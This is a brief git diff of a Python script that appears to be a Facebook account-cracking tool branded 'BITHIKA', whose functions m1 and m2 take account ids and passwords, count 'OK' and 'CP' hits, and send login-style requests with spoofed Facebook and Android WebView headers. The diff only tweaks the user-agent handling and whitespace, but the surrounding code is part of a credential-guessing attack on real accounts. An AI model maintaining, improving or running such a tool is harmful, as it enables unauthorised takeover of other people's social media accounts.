@@ -1042,7 +1042,7 @@ def m1(ids,pwv):
     animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
     sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
     sys.stdout.flush()
-    ua =usragn
+    ua =usragnt
     pro = random.choice(usragent)
     warna = random.choice(my_color)
     try:
@@ -1072,7 +1072,7 @@ def m1(ids,pwv):
     'Content-Length': '1730',
     'Sec-CH-UA': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
     'Sec-CH-UA-Mobile': '?1',
-    'User-Agent': pro,
+    'User-Agent': "Mozilla/5.0 (Linux; Android 14; 23076PC4BI Build/UKQ1.230917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.134 Mobile Safari/537.36",
     'X-Response-Format': 'JSONStream',
     'Content-Type': 'application/x-www-form-urlencoded',
     'X-FB-LSD': 'AVo_Z7twFKE',
@@ -1124,7 +1124,6 @@ def m1(ids,pwv):
  
     except:
         pass
-
 def m2(ids,pwv):
     global loop,oks,cps
     animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
